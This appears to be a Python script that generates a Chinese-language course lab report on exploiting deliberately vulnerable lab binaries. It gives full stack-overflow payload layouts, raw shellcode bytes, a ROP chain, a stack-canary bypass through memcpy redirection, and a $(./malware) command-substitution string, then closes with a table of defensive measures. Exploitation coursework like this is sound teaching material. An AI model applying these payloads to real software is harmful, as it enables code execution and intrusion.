              ["NX", "GNU_STACK RW；dark-calc-nx/dark-log 的线程栈 rw-p",
               "对 nx/log 生效，逼出任务六的 ROP；dark-calc 因固定 RWX 映射而豁免"],
              ["ASLR", "主映像非 PIE；栈与 libc 地址随机（实测 &i 六次各不相同）",
               "对固定代码地址无效；四个 payload 全程不依赖任何随机地址"],
              ["Stack Canary", "dark-log 导入 __stack_chk_fail，fs:0x28 存帧尾",
               "直接覆盖返回地址必被检测（第十节有对照实验的尸检报告）"],
              ["RELRO", "Partial：.got.plt 可写", "本实验未走 GOT 覆写路线"],
              ["长度截断（MAXLEN=15）", "eval 中 min(strlen, 15)", "只限制 shell 表达式，不影响 gets 溢出"],
          ],
          widths=[2.8, 6.4, 7.8])
    page_break(doc)

    # ---------- 4 任务一 ----------
    heading(doc, "四、任务一：观察 input 的栈帧（20 分）", 1)
    think(doc, "设计推导：固定映射使 dark-calc 的调用栈位置稳定，可结合反汇编推导"
               "input 的缓冲区、saved rbp、返回地址与守卫页之间的偏移；以下 GDB 小节用于核对这些推导。")
    heading(doc, "4.1 理论：帧是 ABI 写死的剧本", 2)
    para(doc, "x86-64 System V ABI 下，被调函数开场三连：push rbp; mov rbp,rsp; sub rsp,N。"
              "rbp 钉住帧基址，局部变量在 rbp 之下，call 压入的返回地址在 rbp+8。"
              "input() 的 leave; ret 等价于 mov rsp,rbp; pop rbp; ret：先把 rsp 拽回帧基址，"
              "再连弹两下——第二下弹出来的东西去哪，程序就去哪。所以只要输入越过 "
              "expression[16]，先埋 saved rbp（偏移 16），再埋返回地址（偏移 24），"
              "函数返回的那一刻控制流就归我了。")
    heading(doc, "4.2 静态：序言到 gets 的每一步", 2)
    code(doc, disasm_range("dark-calc", 0x401977, 0x40199F))
    heading(doc, "4.3 实测：GDB 里把帧量了一遍", 2)
    para(doc, "先正面回答官网 Q1–Q3，下面三段 GDB 摘录就是这三个答案的依据。")
    bullet(doc, "调用 input 的是 main：main+9（0x401acc）处执行 call input，把下一条指令 "
                "0x401ad1（main+14）压栈作为返回地址，然后转入 input。", "Q1 ")
    bullet(doc, "前三条指令是 prologue：push rbp 保存调用者 main 的帧指针；mov rbp,rsp 把帧基址"
                "钉在当前栈顶；sub rsp,0x10 为 expression[16] 开出 16 字节局部空间。"
                "此刻 $rbp 指向 0x721000800fe0，其中 0x721000800ff0 正是 main 的 rbp——"
                "来自刚才那条 push rbp，随后 mov rbp,rsp 才把它变成 input 自己的帧基址。", "Q2 ")
    bullet(doc, "$rbp+8（0x721000800fe8）里是 0x401ad1，也就是 call input 压入的返回地址"
                "（main+14）。它由 main 一侧的 call 写入，input 自己的指令没有写过它；"
                "4.4 节逐指令复现了压栈那一刻。", "Q3 ")
    code(doc, required_excerpt(ev, "frame_entry", "01_frame_and_main.txt"))
    code(doc, required_excerpt(ev, "frame_prologue", "01_frame_and_main.txt"))
    code(doc, required_excerpt(ev, "frame_after_gets", "01_frame_and_main.txt"))
    if ev["call_before"] or ev["call_entry"]:
        heading(doc, "4.4 官网任务一 Q4：call input 如何写入返回地址", 2)
        para(doc, "在 main 的 call input 前逐指令执行：call 把下一条指令地址 0x401ad1 "
                  "压入栈顶，再转入 input；该栈槽随后成为 input 的 rbp+8。以下来自补充复现日志。")
        for excerpt in ev["call_before"] + ev["call_entry"]:
            code(doc, excerpt)
    if ev["input_leave"] or ev["input_return"]:
        heading(doc, "4.5 官网任务一 Q5：leave、ret 与调用者现场", 2)
        para(doc, "leave 先令 rsp=rbp，再弹出 saved rbp；ret 弹出 0x401ad1 到 rip，"
                  "回到 main+14。prologue 建立帧，call/ret 转移控制流并压入/弹出返回地址。")
        for excerpt in ev["input_leave"] + ev["input_return"]:
            code(doc, excerpt)
    para(doc, "量出来的结果见图 1（终端截图），栈布局示意如下：")
    code(doc,
         "0x721000801000 ┌──────────────────────────────┐  ← PROT_NONE 守卫页：越界写必死\n"
         "0x721000800ff8 │ ret → 0x401c1f               │  __wrap_main 调 main 压入\n"
         "0x721000800ff0 │ main 的 saved rbp（非 0，随 ASLR）│  main 帧\n"
         "0x721000800fe8 │ ret → 0x401ad1                │  ← 偏移 +24：控制流的钥匙\n"
         "0x721000800fe0 │ saved rbp → 0x721000800ff0    │  ← 偏移 +16\n"
         "0x721000800fd0 │ expression[16]                │  ← gets 从这里开始写，向高地址漫灌\n"
         "               └──────────────────────────────┘")
    picture(doc, os.path.join(FIGS, "fig_frame_input.png"), 6.0, "图 1  终端截图：dark-calc 的 input() 栈帧（缓冲区到返回地址 24 字节）")
    table(doc,
          ["地址（固定）", "槽位", "实测值", "说明"],
          [
              ["0x721000800fd0", "expression[16]", "输入内容", "gets 写入起点；偏移 +0"],
              ["0x721000800fe0", "saved rbp", "0x721000800ff0", "main 的 rbp；偏移 +16"],
              ["0x721000800fe8", "返回地址", "0x401ad1", "main+0xe（call input 之后）；偏移 +24"],
              ["0x721000800ff0", "main 的 saved rbp", "非 0（随 ASLR 变化）", "原内核栈上 __libc_start_main 的帧指针（__wrap_main 未改 rbp）"],
              ["0x721000800ff8", "__wrap_main 的返回地址", "0x401c1f", "call main 压入"],
              ["0x721000801000", "守卫页起点", "PROT_NONE", "越界写到这里直接 SIGSEGV"],
          ],
          widths=[3.4, 3.4, 3.6, 6.6], mono_cols=(0, 2))
    para(doc, "两个数字刻进脑子里：缓冲区到返回地址 24 字节；缓冲区到守卫页 48 字节——"
              "gets 还要写一个 NUL，所以单次输入上限是 47 字节。这个「48 字节牢笼」是任务三"
              "和任务五所有设计约束的源头。")
    page_break(doc)

    # ---------- 5 任务二 ----------
    heading(doc, "五、任务二：长度矩阵与崩溃边界（5 分）", 1)
    think(doc, "设计推导：重定向到管道时 stdout 采用全缓冲，printf 的提示可能仍在父进程"
               "缓冲区，而 system() 的子进程可先写管道，因此行序不同于交互终端。"
               "length_tests.json 保存了事后批量复现的实际输出与退出状态。")
    heading(doc, "5.1 方法", 2)
    para(doc, "向 dark-calc 喂 n 个 '1' 组成的行（n ∈ {0,1,3,8,15,16,20,23,24,31,32,47,48,64,200}），"
              "记录退出状态与 stdout。选 '1' 串是因为 eval 包装出的 echo $((...)) 恒为合法算术式，"
              "能把「溢出」与「shell 语法错误」两个变量干净地分开。")
    heading(doc, "5.2 结果：一条条读", 2)
    rows = []
    for r in ev["lengths"]:
        n, rc = r["length"], r["rc"]
        if n == 0:
            note = "空行：打印内置答案 42_is_The_… 后 exit(0)"
        elif n <= 15:
            note = "正常：Executing: echo $((1…1))，算术输出 n 个 1"
        elif n <= 23:
            note = "saved rbp 被覆盖但返回地址完好；eval 照常截断到 15 字符执行——溢出已经发生，程序毫无察觉"
        elif n == 24:
            note = "生死线①：NUL 把返回地址最低字节清零（0x401ad1→0x401a00），控制流落进 eval 中间，SIGBUS(-7)"
        elif n == 31:
            note = "返回地址低 7 字节被 '1' 覆盖、最高字节被 NUL 清零（0x003131…），非规范地址，ret 后 SIGSEGV(-11)"
        elif n == 32:
            note = "返回地址 8 字节全被 '1' 覆盖（0x3131…3131），非规范地址，ret 后 SIGSEGV(-11)——作业点名的 32 字符"
        elif n <= 47:
            note = "返回地址 8 字节全被 '1' 覆盖（0x3131…），非规范地址，ret 后 SIGSEGV(-11)"
        else:
            note = "生死线②：gets 的 NUL 写进 PROT_NONE 守卫页，gets 自己先崩（SIGSEGV）"
        rows.append([str(n), str(rc), note])
    table(doc, ["输入长度 n", "退出状态", "现象与解释"], rows, widths=[2.4, 2.4, 12.2])
    if ev["length_dumps"]:
        heading(doc, "5.3 题面指定的 20/32 字符栈转储", 2)
        para(doc, "以下补充复现日志在 gets 返回后检查 rbp-0x10。20 字符输入的部分 saved rbp "
                  "被覆盖，但返回地址仍为 0x401ad1；32 字符输入则同时覆盖 saved rbp 与返回地址。")
        for excerpt in ev["length_dumps"]:
            code(doc, excerpt)
    think(doc, "机制分析：n=24 时，NUL 将返回地址从 0x401ad1 改为 0x401a00，"
               "使控制流进入 eval 中间；后续非法 rbp 写入与该次记录的信号相符。"
               "n=31、32 的返回地址被 '1' 字节进一步破坏。下表的 rc 直接取自 "
               "length_tests.json，不把信号差异泛化为其他环境下的保证。")
    heading(doc, "5.4 MAXLEN=15 的截断：迟到的闸门", 2)
    para(doc, "eval 只在 strlen(command_buf) > 15 时截断（0x4019e9 处 cmp rax,0xf）。"
              "16–23 字节输入早已越出 expression[16]，程序照样把前 15 个字符包进 echo $(( )) "
              "执行——闸门设在溢出之后，拦得住 shell 表达式的长度，拦不住已经发生的栈破坏。"
              "第五节留下的尾巴是：这扇闸门本身能不能被钻？第六节回答。")
    page_break(doc)

    # ---------- 6 任务三 ----------
    heading(doc, "六、任务三：溢出执行 ./malware（25 测试 + 5 报告）", 1)
    think(doc, "设计推导：常规的 24 字节 padding + pop rdi; ret + 参数 + system@plt "
               "需要 48 字节输入，gets 还需在下一字节写 NUL。由任务一的固定栈边界可知，"
               "该 NUL 将落到 PROT_NONE 守卫页，因此不选用这条三 qword 链。"
               "len48_fault 的补充复现验证了这类越界终止行为；这里不把它描述为未留痕的初次试验。")
    para(doc, "硬约束：单次输入 ≤ 47 字节，而覆盖返回地址槽就要 24 字节，剩给整条链的只有 23 字节，"
              "放不下三个 qword。换思路——链子放不下，就找现成的调用点。")
    heading(doc, "6.1 翻盘点：eval 里那行现成的 system 调用", 2)
    code(doc, disasm_range("dark-calc", 0x401A6B, 0x401A86))
    para(doc, "0x401a6b 是 eval 内部「mov edi,0x6030d0; call system@plt」的起始。"
              "mov edi 是立即数赋值，不会弹栈，也不是 pop rdi；这两条指令直接设置 system 的"
              "第一个参数并完成调用。input() 的 strcpy(command_buf, expression) 已把 payload "
              "开头第一个 NUL 之前的字符串 \"./malware\" 复制到 command_buf，正好符合参数要求。")
    heading(doc, "6.2 payload：32 字节的设计", 2)
    table(doc,
          ["偏移", "字节", "作用"],
          [
              ["0 – 9", "\"./malware\" + NUL", "command_buf 的 shell 命令（strcpy 拷到第一个 NUL 为止）"],
              ["10 – 15", "'A' × 6", "凑满 16 字节（expression 的容量）"],
              ["16 – 23", "fixed_stack_top - 0x10", "保留 main 的固定帧指针，使 eval 的 leave 恢复到 __wrap_main 的返回路径"],
              ["24 – 31", "0x401a6b（小端）", "返回地址 → eval 的 system 调用点"],
          ],
          widths=[2.0, 5.4, 9.6], mono_cols=(1,))
    code(doc, payload_hexdump("payload.py"))
    heading(doc, "6.3 GDB 里对一遍账", 2)
    if ev["sys_site"]:
        code(doc, ev["sys_site"])
        code(doc, required_excerpt(ev, "sys_after", "05_system_epilogue.txt"))
        code(doc, required_excerpt(ev, "sys_epilogue", "05_system_epilogue.txt"))
        para(doc, "（隔离工作副本中包含 ./malware。进程树和两行 ### 横幅来自子进程；"
                  "rdi=0x6030d0、command_buf=\"./malware\"。saved rbp 保留 main 的固定帧指针，"
                  "system 返回后 eval 的 leave 恢复原包装函数路径，程序正常退出。）")
    else:
        para(doc, "此处不展示与新 saved-rbp 设计不匹配的旧 GDB 记录；重新采集 "
                  "05_system_epilogue.txt 后，将按 main fixed frame pointer / wrapper return "
                  "小节自动显示。当前退出状态见下方结构化运行日志。")
    heading(doc, "6.4 端到端：起爆成功", 2)
    picture(doc, os.path.join(FIGS, "fig_proc_tree.png"), 6.4, "图 2  终端截图：malware 沿父链找到 dark-calc（进程树与成功横幅）")
    code(doc, ci_blocks["payload.py"])
    think(doc, "机制解释：saved rbp 保留 fixed_stack_top-0x10 的 main 帧指针，"
               "而不是写入无效填充。system 返回后，eval 的 leave 恢复该帧并经过"
               "fixed_stack_top-8 处原有的 __wrap_main 返回地址退出；实际退出状态见下方记录。"
               "payload_canary 的限制另在第十节说明。")
    heading(doc, "6.5 算术扩展里的命令替换（旁路观察）", 2)
    para(doc, "事后复现使用 12 字符的 $(./malware)，长度在 15 字符限制内。"
              "dash 在算术扩展中先执行命令替换；malware 的进程树和成功横幅进入 **stderr**，"
              "算术解析错误也写入 stderr。stdout 只有提示、Executing 和内置答案，"
              "所以该旁路不能通过当前只搜索 stdout 的 CI。本任务仍按要求使用栈溢出。")
    if ev.get("command_substitution"):
        code(doc, ev["command_substitution"])
        para(doc, "证据：analysis/logs/command_substitution.txt（由 tools/capture_command_substitution.py "
                  "在隔离靶机副本上采集，与常规 GDB 观察分开标注）。")
    think(doc, "设计结论：该旁路说明 system() 拼接用户输入会引入命令替换攻击面；"
               "但它不是满足 stdout 判分条件的替代 payload，也不改变本任务的栈溢出实现。")
    page_break(doc)

    # ---------- 7 任务四 ----------
    heading(doc, "七、任务四：main 的机器码与内存布局（5 分）", 1)
    para(doc, "GDB 里 disassemble /r main，带上原始字节逐条读：")
    code(doc, required_excerpt(ev, "main_bytes", "01_frame_and_main.txt"))
    table(doc,
          ["地址", "机器码", "指令", "解读"],
          [
              ["0x401ac3", "55", "push rbp", "保存调用者帧指针"],
              ["0x401ac4", "48 89 e5", "mov rbp,rsp", "建立 main 自己的帧基址"],
              ["0x401ac7", "b8 00 00 00 00", "mov eax,0", "置零 rax 高位；循环起点"],
              ["0x401acc", "e8 a6 fe ff ff", "call 0x401977", "rel32=0xfffffea6=-0x15a；0x401ad1-0x15a=0x401977 → input"],
              ["0x401ad1", "b8 00 00 00 00", "mov eax,0", "call input 之后"],
              ["0x401ad6", "e8 fc fe ff ff", "call 0x4019d7", "rel32=-0x104；0x401adb-0x104=0x4019d7 → eval"],
              ["0x401adb", "eb ea", "jmp 0x401ac7", "rel8=0xea=-22；0x401add-22=0x401ac7，回循环头"],
          ],
          widths=[2.2, 3.0, 3.0, 8.8], mono_cols=(0, 1, 2))
    think(doc, "读机器码有个技巧：call/jmp 全是 RIP 相对的，机器码里装的是「到下一指令的有符号"
               "偏移」。e8 a6 fe ff ff 里 a6 fe ff ff 是小端 rel32 = -0x15a，下一指令是 "
               "0x401ad1，减掉 0x15a 正好 0x401977。所以反汇编器给出的 call 0x401977 其实是"
               "算出来的，不是机器码里写的。")
    para(doc, "其余要点：main 没有局部变量，所以没有 sub rsp；0x401ac7→0x401adb 是 while(1)，"
              "一次 input()+eval() 之后跳回循环头继续读；main 入口 rsp%16=8，push rbp 后 "
              "rsp%16=0，call 压栈后子函数入口 rsp%16=8——符合 SysV ABI 的 16 字节栈对齐。")
    if ev["main_memory"]:
        heading(doc, "7.1 用 x 检查 main 的内存与三条指令区间", 2)
        for excerpt in ev["main_memory"]:
            code(doc, excerpt)
        para(doc, "x86-64 采用小端字节序和变长指令，三条指令在内存中按地址递增连续排列：")
        table(doc, ["指令内存区间（左闭右开）", "字节", "指令", "rip 变化"],
              [["[0x401ac3, 0x401ac4)", "55", "push rbp", "0x401ac3 → 0x401ac4"],
               ["[0x401ac4, 0x401ac7)", "48 89 e5", "mov rbp,rsp", "0x401ac4 → 0x401ac7"],
               ["[0x401ac7, 0x401acc)", "b8 00 00 00 00", "mov eax,0", "0x401ac7 → 0x401acc"]],
              widths=[4.6, 4.4, 3.6, 4.4], mono_cols=(0, 1, 2, 3))
        para(doc, "补充复现日志中的 x/9bx main 与逐条 stepi 对上表提供了直接观察；"
                  "区间长度分别为 1、3、5 字节。")
    page_break(doc)

    # ---------- 8 任务五 ----------
    heading(doc, "八、任务五：48 字节牢笼里的 shellcode（25 测试 + 5 报告）", 1)
    think(doc, "readelf 说 GNU_STACK RW——不能执行；运行期 maps 说 0x721000001000–801000 是 "
               "rwxp——可以执行。ELF 头会撒谎，文件名会撒谎（带 nx 的那个反而是普通栈），"
               "只有页表不撒谎。dark-calc 的「栈」是 init_fixed_stack 用 mmap 在固定地址造的"
               "RWX 映射，__wrap_main 把 rsp 切过去才开始跑 main。后果有二：地址恒定（ASLR 对"
               "栈失效），页可执行（该固定映射不受普通线程栈 NX 限制）。任务五的全部难度就浓缩成一句话——"
               "在 47 字节的输入预算里，塞下一段能调 grade_eval(4) 的机器码。")
    heading(doc, "8.1 固定栈的实锤", 2)
    code(doc, required_excerpt(ev, "fixed_maps", "02_fixed_stack.txt"))
    picture(doc, os.path.join(FIGS, "fig_fixed_stack.png"), 6.4, "图 3  终端截图：dark-calc 的固定栈映射（8 MiB rwxp，两端各一页守卫页）")
    code(doc, ev["wrap_entry"])
    heading(doc, "8.2 shellcode：21 字节，把预算花在刀刃上", 2)
    code(doc, "b8 87 1a 40 00  mov  eax, 0x401a87        ; grade_eval（非 PIE 下 32 位即完整地址）\n"
              "6a 04          push 4\n"
              "5f             pop  rdi                    ; edi = 4\n"
              "2d ce 00 00 00  sub  eax, 0xce             ; eax = 0x4019b9（input 的 exit(0) 调用点）\n"
              "50             push rax                    ; 把 exit0 作为 grade_eval 的返回地址压栈\n"
              "05 ce 00 00 00  add  eax, 0xce             ; eax 恢复为 0x401a87\n"
              "ff e0          jmp  rax                    ; 进 grade_eval")
    para(doc, "两处设计都踩在预算上：其一，非 PIE 主映像所有代码地址都 < 2^32，用 mov eax 加 "
              "sub/add 的 32 位立即数形式，比 movabs 短，21 字节就装下「设参 + 调函数 + 干净退出」"
              "三件事（仍塞进 24 字节的 expression+saved rbp 槽）。其二，进 grade_eval 前先 "
              "push rax（=exit0）：这既是给 grade_eval 安排的返回地址，更关键的是把 rsp 下移一个 "
              "qword——jmp 进入时 grade_eval 的 rsp%16 恰好等于 8，与正常 call 的约定一致，其内部 "
              "printf 的 movaps 不会因未对齐崩掉（对任意 glibc 稳健）。grade_eval 打印并 fflush 后 "
              "ret，从栈顶弹出 exit0 调用点（mov edi,0; call exit@plt），进程 exit(0)，干净离场。")
    heading(doc, "8.3 实测：字节流在固定栈上活了过来", 2)
    code(doc, ev["shellcode_inspect"])
    code(doc, ev["grade_hit"])
    code(doc, ev["shellcode_result"])
    heading(doc, "8.4 对照组：同一串字节，在 dark-calc-nx 上第一步就死", 2)
    para(doc, "把完全相同的 shellcode 喂给 dark-calc-nx，再把 PC 强制指到栈上：")
    code(doc, required_excerpt(ev, "nx_frame", "03_nx.txt"))
    code(doc, required_excerpt(ev, "nx_maps", "03_nx.txt"))
    code(doc, required_excerpt(ev, "nx_fault", "03_nx.txt"))
    para(doc, "同一批字节在 dark-calc 上执行、在 dark-calc-nx 上取指即 SIGSEGV——"
              "一条指令都没跑完。这就是 NX 的实锤：不是「文件名里带 nx」，是页表里没有 X。")
    page_break(doc)

    # ---------- 9 任务六 ----------
    heading(doc, "九、任务六：NX 之下的 ROP 攻击（10 测试 + 10 报告）", 1)
    think(doc, "设计推导：普通线程栈受 NX 与 ASLR 约束，而非 PIE 主映像的代码地址固定，"
               "因此改用 ROP。x86 变长指令允许从已有指令的中间进入；按字节扫描 csu 尾部，"
               "可由 41 5f c3 的第二个字节得到 pop rdi; ret。下面用静态反汇编核对该构造，"
               "不虚构未留痕的探索顺序。")
    heading(doc, "9.1 捡零件：41 5f c3 往前走一个字节", 2)
    code(doc, disasm_range("dark-calc-nx", 0x401A2A, 0x401A35))
    para(doc, "__libc_csu_init 的尾声是 pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; "
              "ret，结尾两条的机器码是 41 5f c3（pop r15; ret）。x86 是变长指令集，"
              "「指令边界」只是反汇编器的习惯，CPU 只认字节流：从 0x401a33 进入，0x5f 译码为 "
              "pop rdi，0xc3 译码为 ret——一个完美的未对齐 gadget 到手。")
    code(doc, "0x401a32: 41 5f c3        pop r15; ret\n"
              "0x401a33:    5f c3        pop rdi; ret   ← 从这里进入")
    para(doc, "范围对照：官网提示所需 gadget 位于 0x4019d0–0x401ae3。本链真正用于拼装参数的 "
              "pop rdi; ret（0x401a33）与裸 ret（0x401a34）都在该范围内；0x401978 grade_eval "
              "与 0x4018aa exit(0) 调用点是链的落点与清理入口，属于函数/现成调用点，"
              "不是用于弹参数的 gadget。")
    heading(doc, "9.2 链与栈对齐", 2)
    table(doc,
          ["偏移", "值（小端）", "作用"],
          [
              ["0 – 23", "'R' × 24", "覆盖 expression[16] 与 saved rbp"],
              ["24 – 31", "0x401a33", "pop rdi; ret"],
              ["32 – 39", "0x0000000000000004", "rdi = 4（grade）"],
              ["40 – 47", "0x401a34", "裸 ret——栈对齐垫片"],
              ["48 – 55", "0x401978", "grade_eval"],
              ["56 – 63", "0x4018aa", "mov edi,0; call exit@plt → exit(0)"],
          ],
          widths=[2.2, 6.2, 8.6], mono_cols=(1,))
    para(doc, "对齐演算（为什么中间要垫一个裸 ret）：input 的 ret 之后 rsp%16=0，进入 pop rdi；"
              "pop rdi 弹掉参数 4 后 rsp%16=8；pop rdi 尾部的 ret 弹到垫片 ret，此时 rsp%16=0；"
              "垫片 ret 再弹到 grade_eval，此时 rsp%16=8——与正常 call 的入口约定完全一致，所以 "
              "它内部 printf 的 movaps 不会因未对齐崩掉（对任意 glibc 稳健）。若省掉这个垫片，"
              "grade_eval 会以 rsp%16=0 进入，严格 glibc 上 printf 可能直接崩溃。"
              "dark-calc-nx 的 grade_eval 没有 canary；链中不依赖伪造一个 canary。"
              "整条链只用固定代码地址，不依赖随机栈地址或 libc 地址。")
    heading(doc, "9.3 运行记录（从 ci_simulation.txt 提取）", 2)
    code(doc, ci_blocks["payload_rop.py"])
    page_break(doc)

    # ---------- 10 任务七 ----------
    heading(doc, "十、任务七：绕过 Stack Canary（10 测试 + 10 报告）", 1)
    think(doc, "设计推导：返回地址在偏移 296，canary 在 280；直接覆盖返回地址会先改变 canary。"
               "canary 每进程随机，不能靠静态 payload 恢复原值。04b 对照日志记录了 288 字节输入"
               "导致的 stack smashing detected 与 SIGABRT。")
    heading(doc, "10.1 对照实验：金丝雀真的会叫", 2)
    code(doc, ev["smash_before"])
    code(doc, ev["smash_after"])
    think(doc, "设计推导：全 'A' 的长输入会同时覆盖 len（偏移 256）与 canary（偏移 280），"
               "并使 memcpy 的目的地址失去合法性；它不适合作为只改变 canary 的对照。"
               "因此采用 04b 中有记录的 288 字节输入观察 canary 校验，"
               "再利用 len 控制 memcpy 的目的地址。")
    heading(doc, "10.2 顿悟：金丝雀只盯着自己的窝", 2)
    para(doc, "canary 校验检查的是「rbp-8 的值变了没有」，不是「控制流变了没有」。那么问题"
              "变成：有没有一条路，改掉返回地址、却不经过 rbp-8？有——让那 128 字节的 memcpy "
              "改道。len 在偏移 256，先于 canary（280）被输入控制；令 len=0xa0=160，目的地 = "
              "logMsg+0xa0 = rbp。拷贝区间 rbp..rbp+0x7f 精准覆盖 saved rbp 与返回地址，"
              "canary 原封不动，校验自然通过。")
    picture(doc, os.path.join(FIGS, "fig_darklog.png"), 5.6, "图 4  终端截图：dark-log 的 canary 保持原值，返回地址被 memcpy 改写")
    heading(doc, "10.3 payload：恰好 260 字节", 2)
    table(doc,
          ["偏移", "字节", "作用"],
          [
              ["0 – 7", "'K' × 8", "fake saved rbp"],
              ["8 – 15", "0x4018a3", "pop rdi; ret（csu 尾部 41 5f c3 的第 2 字节）"],
              ["16 – 23", "4", "rdi = 4"],
              ["24 – 31", "0x4018a4", "裸 ret——栈对齐垫片"],
              ["32 – 39", "0x401677", "grade_eval"],
              ["40 – 255", "'L' 填充", "凑到 len 字段之前"],
              ["256 – 259", "0xa0 00 00 00", "len = 160 → memcpy 目的地 = rbp"],
          ],
          widths=[2.4, 4.2, 10.4], mono_cols=(1,))
    para(doc, "260 这个数不是随便选的：字节 0–127 是 memcpy 的源（fake 帧就放这里），"
              "256–259 是 len，gets 的 NUL 落在 260——正好掉进 pad[8] 区间，离金丝雀的窝"
              "（280）还有 20 字节的安全距离。")
    code(doc, payload_hexdump("payload_canary.py"))
    heading(doc, "10.4 GDB 里看着金丝雀打盹", 2)
    code(doc, ev["canary_before"])
    code(doc, ev["canary_after"])
    code(doc, ev["canary_hit"].split("#1")[0].rstrip())
    code(doc, ev["canary_end"])
    para(doc, "拷贝前后 input 的 canary 保持一致；len=160、目的地=rbp；返回地址槽变成 0x4018a3。"
              "grade_eval 以 edi=4 进入，打印并 flush 目标字符串。之后控制流返回 'L' 填充区域；"
              f"当前结构化运行记录的 target_rc={ci_records['payload_canary.py']['target_rc']}，"
              "stdout 是否命中以第十一节为准。若后续改变清理链，应以重新采集的 GDB/CI 记录更新此解释。")
    heading(doc, "10.5 反推防守：重排局部变量，让这枪哑火", 2)
    para(doc, "为什么这枪能打中？根子在于结构体把标量 len 放到了缓冲区 expression 的"
              "高地址侧（expression → logMsg → len），而 gets 的溢出方向恰恰是向高地址——"
              "溢出一路写过去，把 len 也顺手改成了 0xa0，我才能把 memcpy 的落点从 logMsg "
              "改道到 rbp。")
    para(doc, "要让这枪哑火，只需把标量挪到缓冲区的低地址侧，比如改成 "
              "struct { int len; char pad[8]; char expression[128]; char logMsg[128]; }。"
              "这样 gets(expression) 向高地址漫灌时，只会先撞上紧随其后的 logMsg，再撞上 "
              "canary，永远够不到低地址侧的 len。len 恒为 0，memcpy 落点恒在 logMsg 界内，"
              "「改道」的杠杆就没了；而若想直接一路灌到返回地址，又必然先踩中夹在缓冲区与 "
              "saved rbp 之间的 canary，被 __stack_chk_fail 当场拦下。")
    para(doc, "这正是现代编译器的通用策略：把数组/缓冲区尽量贴近 canary、把标量放到远离"
              "溢出方向的低地址，让「够到返回地址」与「不碰 canary」二者不可兼得。本实验为了"
              "留出利用空间，刻意用一个结构体把字段顺序钉死成 expression→logMsg→len，"
              "才开出了这条不经过金丝雀的绕路。")
    page_break(doc)

    # ---------- 11 验收 ----------
    heading(doc, "十一、验收：虚拟机记录与已完成的公开 CI", 1)
    rows = [[r["payload"], r["target"], str(r["bytes"]),
             str(r["target_rc"]) + (" (SIGBUS)" if r["target_rc"] == -7 else
                                    " (SIGSEGV)" if r["target_rc"] == -11 else ""),
             str(bool(r["pass"]))] for r in ev["ci"]]
    table(doc, ["payload", "目标", "字节数（含换行）", "目标退出状态", "stdout 预期串命中"],
          rows, widths=[4.2, 3.2, 2.0, 3.6, 4.0], mono_cols=(0, 1))
    para(doc, f"上表由 analysis/logs/ci_simulation.json 生成，本次本地记录为 {ci_pass_count}/{ci_total} "
              "命中预期 stdout。tools/run_evidence.py 记录生成、stdin 重定向与 stdout 匹配等核心"
              "判分步骤，并保留退出状态和 stderr；它不是 GitHub Actions 的逐步骤等同实现，"
              "各目标的实际退出状态以表格和所引日志为准。")
    para(doc, "公开 CI 的历史结果：GitHub Actions run 45372795393（2026-11-24，提交 "
              "d54873fdab7ecfe25d5650f3534767b792d45d95）已完成且结论为 success；"
              "Test every exploit payload 和 Check report PDF 两个 job 均成功。"
              "这只说明该次提交的公开检查已通过；后续修改仍须以新提交的实际运行结果为准，"
              "也不据此承诺人工评分。")
    para(doc, "payload.py 的完整输出见 6.4 节，其余三段按 payload 小节从 "
              "analysis/logs/ci_simulation.txt 提取：")
    code(doc, ci_blocks["other"])
    para(doc, "隔离工作副本与核心复现命令（工具验证仓库 attack/ 哈希，不删除 ~/lab3）：")
    code(doc, """# 1. 准备独立工作副本和 fixtures
export ATTACKLAB_WORKDIR="$(bash tools/prepare_lab.sh)"
export ATTACKLAB_FIXTURE_DIR="$ATTACKLAB_WORKDIR/fixtures"
bash tools/screens/setup.sh

# 2. 证据采集（GDB / 反汇编 / 长度矩阵 / 核心判分复现）
bash   tools/capture_gdb.sh
bash   tools/capture_disassembly.sh
python3 tools/run_evidence.py
python3 tools/capture_command_substitution.py

# 3. 单个 payload 手动验证（隔离副本）
python3 payload.py > "$ATTACKLAB_FIXTURE_DIR/p5.bin"
(cd "$ATTACKLAB_WORKDIR" && ./dark-calc < "$ATTACKLAB_FIXTURE_DIR/p5.bin")""")
    para(doc, "当前官方 payload job 验证 attack/ 哈希、生成 payload、在 attack/ 中重定向"
              "目标 stdin、分离保存 stdout/stderr，再搜索 stdout 中的预期串，并提供 15 s "
              "超时等运行约束。本地日志用于复现核心行为，不等同于复刻整个 Actions 环境。")
    page_break(doc)

    # ---------- 12 防守 ----------
    heading(doc, "十二、防守视角：从攻击到防御", 1)
    table(doc,
          ["层次", "措施", "堵的是本实验的哪一枪"],
          [
              ["源代码", "彻底移除 gets()：fgets/read + 显式边界 + 长度白名单", "所有任务的共同根源——无界读入"],
              ["源代码", "用户输入永不拼进 shell：解析后 execl/posix_spawn，或表达式白名单", "eval 的 system(command_buf)；6.5 节的命令替换注入"],
              ["编译期", "-fstack-protector-all（所有函数都放 canary）", "第七节的 canary 绕过（注意：只堵「盲写」）"],
              ["编译期", "局部变量重排：标量放缓冲区低地址侧、缓冲区贴近 canary（见 10.5）", "第七节 len 改道 memcpy 的写原语"],
              ["编译期", "默认 NX（-z noexecstack）并禁止手工 RWX 映射；W^X", "第八节的固定 RWX 栈"],
              ["链接期", "PIE（-fPIE -pie）+ 完整 ASLR", "第六/九节的固定 gadget 地址"],
              ["链接期", "FULL RELRO（-Wl,-z,relro,-z,now）", "GOT 覆写类攻击"],
              ["系统层", "seccomp/AppArmor 限制 exec 与文件访问；非特权用户运行", "溢出后 system(\"./malware\") 的落地"],
              ["工程", "把长度矩阵与 payload 回归测试并入 CI", "防止漏洞回归（本仓库 CI 已内置 payload 测试）"],
          ],
          widths=[1.8, 9.4, 5.8])
    para(doc, "每一行都对应一个本实验亲手打穿的环节。单点防御都会被绕过——"
              "金丝雀看不到「绕路」，NX 挡不住「借代码」，ASLR 架不住「不依赖地址」——"
              "只有叠起来用（纵深防御）才有意义。")
    page_break(doc)

    # ---------- 13 复盘 ----------
    heading(doc, "十三、复盘：踩过的坑与捡到的顿悟", 1)
    bullet(doc, "帧是剧本，溢出是彩蛋：rbp+8 的返回地址决定函数结局，gets 漫灌一旦越过缓冲区，剧本就归攻击者改。", "① ")
    bullet(doc, "只有页表不撒谎：GNU_STACK、文件名、编译选项都是「声明」；0x7210 那行 rwxp 才是真相。静态分析负责怀疑，运行期观察负责定罪。", "② ")
